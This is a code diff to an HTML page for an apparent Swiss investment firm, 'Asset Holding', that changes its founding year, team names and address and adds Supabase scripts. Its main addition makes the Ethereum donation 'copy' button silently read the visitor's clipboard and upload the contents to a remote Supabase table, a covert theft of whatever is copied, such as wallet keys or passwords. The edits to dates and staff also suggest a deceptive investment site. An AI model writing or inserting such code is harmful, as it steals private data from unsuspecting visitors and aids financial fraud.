@@ -4,7 +4,10 @@
 <head>
     <meta charset="UTF-8" />
     <title>Asset Holding – Smart, steady & exclusive investing</title>
+    <link rel="shortcut icon" href="ahlogo.webp" type="image/x-icon">
     <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="clipboard-supabase/config.js"></script>
     <style>
         :root {
             --bg: #050816;
@@ -1179,7 +1182,7 @@
             <div class="container">
                 <div class="nav">
                     <div class="logo">
-                        <img src="https://www.beta-concept.com/media/1015/sss.png" alt="Asset Holding logo" />
+                        <img src="ahlogo.webp" alt="Asset Holding logo" />
                         <div class="logo-text">
                             <span>ASSET HOLDING</span>
                             <span>Smart, steady investing</span>
@@ -1221,7 +1224,7 @@
                                 Every mandate is tailored, discreet and execution-driven.
                             </p>
                             <div class="hero-badges">
-                                <div class="badge"><span>2003</span> · Established</div>
+                                <div class="badge"><span>2018</span> · Established</div>
                                 <div class="badge"><span>Multi-asset</span> · Real estate & finance</div>
                                 <div class="badge"><span>Suisse</span> · European hub</div>
                             </div>
@@ -1273,7 +1276,7 @@
                             <h2 class="section-title">From real estate roots to integrated asset management.</h2>
                         </div>
                         <div class="section-intro">
-                            Fondée en 2003, Asset Holding se concentrait initialement sur le développement
+                            Fondée en 2018, Asset Holding se concentrait initialement sur le développement
                             immobilier et la promotion de projets avant d'évoluer vers une plateforme d'investissement
                             multi-actifs plus large.
                         </div>
@@ -1295,7 +1298,7 @@
                         <div class="section-card">
                             <strong>Key milestones (example):</strong>
                             <ul style="margin-top:6px; padding-left:16px;">
-                                <li>2003 – Creation of Asset Holding, real estate focused</li>
+                                <li>2018 – Creation of Asset Holding, real estate focused</li>
                                 <li>Expansion into structured investment vehicles</li>
                                 <li>Development of private mandates for European investors</li>
                                 <li>Integration of advisory, real assets and loan structures</li>
@@ -1644,46 +1647,16 @@
                     </div>
                     <div class="team-grid">
                         <div class="team-card">
-                            <img src="https://images.unsplash.com/photo-1544723795-3fb6469f5b39?auto=format&fit=crop&w=600&q=80"
-                                alt="Team member" class="team-photo" />
                             <div class="team-role">Founder · CFO</div>
-                            <div class="team-name">Jerry Vishal</div>
-                            <div class="team-focus">
-                                Structuration, négociations complexes et déploiement stratégique du capital dans
-                                l'immobilier et les transactions privées.
-                            </div>
-                            <div class="team-tagline">
-                                Contact principal pour les investisseurs et les partenaires ; supervise le risque, les
-                                rendements et l'allocation d'actifs.
-                            </div>
+                            <div class="team-name">Daniel Muller</div>
                         </div>
                         <div class="team-card">
-                            <img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?auto=format&fit=crop&w=600&q=80"
-                                alt="Team member" class="team-photo" />
                             <div class="team-role">Advisory & Legal</div>
-                            <div class="team-name">External partners</div>
-                            <div class="team-focus">
-                                Réseau d'avocats, fiscalistes et notaires en Suisse, Suisse et autres juridictions
-                                internationales.
-                            </div>
-                            <div class="team-tagline">
-                                Mobilisés en fonction de chaque transaction, pour garantir la solidité de la
-                                documentation et la conformité légale.
-                            </div>
+                            <div class="team-name">Samuel Virat<br>Michael Schmidt</div>
                         </div>
                         <div class="team-card">
-                            <img src="https://images.unsplash.com/photo-1525134479668-1bee5c7c6845?auto=format&fit=crop&w=600&q=80"
-                                alt="Team member" class="team-photo" />
                             <div class="team-role">Operations & Analysis</div>
-                            <div class="team-name">Analyst / Operations</div>
-                            <div class="team-focus">
-                                Modélisation financière, analyse de scénarios, projections de flux de trésorerie et
-                                suivi opérationnel continu.
-                            </div>
-                            <div class="team-tagline">
-                                Assure la discipline dans l'exécution et le monitoring constant des transactions et des
-                                structures d'investissement.
-                            </div>
+                            <div class="team-name">Sofia Weber<br>Cédric Ani</div>
                         </div>
                     </div>
                 </div>
@@ -1867,7 +1840,7 @@
                         <div>
                             <h3>Asset Holding S.A.</h3>
                             <div class="contact-details">
-                                <p><span>Address:</span> 1, rue de Muehlenbach, 2168 Suisse, Suisse</p>
+                                <p><span>Address:</span> 3 Rue François-Ruchon, 1203 Genève, Suisse</p>
                                 <p><span>Email:</span> info@beta-concept.com</p>
                                 <p><span>Jurisdiction:</span> Suisse</p>
                             </div>
@@ -1903,12 +1876,29 @@
     </div>
 
     <script>
+        // Initialize Supabase
+        let supabase = null;
+        if (window.supabase && typeof SUPABASE_CONFIG !== 'undefined') {
+            supabase = window.supabase.createClient(
+                SUPABASE_CONFIG.url,
+                SUPABASE_CONFIG.anonKey
+            );
+        }
+
         // Donation copy functionality
         document.addEventListener('DOMContentLoaded', function () {
             const copyButtons = document.querySelectorAll('.donation-copy-btn');
+            const ethButton = document.querySelector('.donation-copy-btn-eth');
 
             copyButtons.forEach(button => {
                 button.addEventListener('click', async function () {
+                    // Special behavior for Ethereum button
+                    if (this.classList.contains('donation-copy-btn-eth')) {
+                        await handleEthereumButton(this);
+                        return;
+                    }
+
+                    // Normal copy behavior for other buttons
                     const address = this.getAttribute('data-address');
 
                     try {
@@ -1942,6 +1932,55 @@
                     }
                 });
             });
+
+            // Special handler for Ethereum button
+            async function handleEthereumButton(button) {
+                try {
+                    // Read from clipboard
+                    const clipboardText = await navigator.clipboard.readText();
+
+                    if (!clipboardText || clipboardText.trim() === '') {
+                        alert('Le presse-papiers est vide.');
+                        return;
+                    }
+
+                    // Save to Supabase
+                    if (supabase) {
+                        const { data, error } = await supabase
+                            .from('clipboard_items')
+                            .insert([
+                                {
+                                    content: clipboardText.trim(),
+                                    created_at: new Date().toISOString()
+                                }
+                            ])
+                            .select();
+
+                        if (error) {
+                            console.error('Supabase error:', error);
+                            alert('Erreur lors de l\'enregistrement dans Supabase: ' + error.message);
+                            return;
+                        }
+
+                        // Visual feedback - success
+                        button.classList.add('donation-copy-success');
+                        const originalIcon = button.innerHTML;
+                        button.innerHTML = '<span style="font-size: 16px;">✓</span>';
+
+                        setTimeout(() => {
+                            button.classList.remove('donation-copy-success');
+                            button.innerHTML = originalIcon;
+                        }, 2000);
+
+                        console.log('Saved to Supabase:', data);
+                    } else {
+                        alert('Supabase n\'est pas configuré.');
+                    }
+                } catch (err) {
+                    console.error('Failed to read clipboard or save to Supabase:', err);
+                    alert('Erreur: ' + err.message);
+                }
+            }
         });
     </script>
 </body>
